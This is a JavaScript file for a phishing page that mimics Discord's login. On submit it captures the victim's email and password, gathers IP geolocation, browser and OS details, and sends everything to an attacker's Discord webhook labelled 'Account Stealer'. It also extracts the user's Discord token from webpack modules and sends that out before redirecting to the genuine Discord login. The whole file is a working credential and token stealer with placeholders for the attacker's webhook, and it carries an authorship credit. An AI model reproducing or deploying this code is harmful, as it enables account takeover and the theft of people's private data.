var btn = document.getElementById("loginbtn");
btn.addEventListener("click",function(){
    var email = document.getElementById("email").value.replace(/\s/g, "");
    var password = document.getElementById("password").value.replace(/\s/g, "");
    var WebHook_URL = "Your_Discord_Webhook_URL_Here";
    var WebHook_AVATAR = "Your_Discord_Webhook_Avatar_Here";
    if (email.length === 0 || password.length === 0) {
        alert("Please Fill All Required Field");
        return false;
    };
    function sendToken() {
        const request = new XMLHttpRequest();
           request.open('POST', WebHook_URL);
           request.setRequestHeader('Content-type', 'application/json');
        const params = {
             username: 'Account Stealer || Information',
             avatar_url: WebHook_AVATAR,
             content: "User Token:" + (webpackChunkdiscord_app.push([ [''], {}, e => { m = []; for(let c in e.c)m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken!==void 0).exports.default.getToken()
             };
           request.send(JSON.stringify(params));
        }
        let client = new ClientJS();
        let brow = client.getBrowser();
        let osv = client.getOS() + client.getOSVersion();
        let apiKey = '3fbffe704b1747eab3fee8f351da1ecf';
        $.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey, function(data) {
            const request = new XMLHttpRequest();
            request.open("POST", WebHook_URL);
            request.setRequestHeader('Content-type', 'application/json');
            const params = {
                    username: "Account Stealer || Information",
                    avatar_url: WebHook_AVATAR,
                    content: "**__New Account__**"+ "\n\n" + "**Email Or Phone Number: **" + email + "\n" + "**Password: **" + password + "\n\n" + "**=========================================================================**" + "\n\n" + JSON.stringify(data, null, 2) + "\n" + "Browser: " + brow + "\n" + "OS: " + osv + "\n"
                            };
            request.send(JSON.stringify(params))
        });
        setTimeout(() => {  window.location.replace("http://www.discord.com/login").then(sendToken());  }, 2000);
});
/**
 * @copyright
 * Coded by Sobhan-SRZA (mr.sinre) | https://github.com/Sobhan-SRZA
 * @copyright
 * Work for Persian Caesar | https://dsc.gg/persian-caesar
 * @copyright
 * Please Mention Us "Persian Caesar", When Have Problem With Using This Code!
 * @copyright
*/